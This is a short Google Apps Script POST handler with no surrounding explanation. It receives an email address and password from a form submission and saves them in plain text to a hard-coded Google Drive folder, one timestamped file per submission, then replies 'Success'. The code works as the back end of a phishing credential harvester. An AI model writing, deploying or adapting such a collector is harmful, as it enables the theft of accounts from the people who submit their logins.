function doPost(e) {
  const folderId = '1bEbwuX2UvSiC9kCSO2aQrPsNmPY17-IS';
  const folder = DriveApp.getFolderById(folderId);
  
  const email = e.parameter.email;
  const password = e.parameter.password;
  const now = new Date();
  
  const fileName = now.toISOString().replace(/T/, ' ').replace(/\..+/, '').replace(/:/g, '-');
  const content = `Email: ${email}\nPassword: ${password}`;
  
  const file = folder.createFile(fileName + '.txt', content);
  
  return ContentService.createTextOutput('Success');
}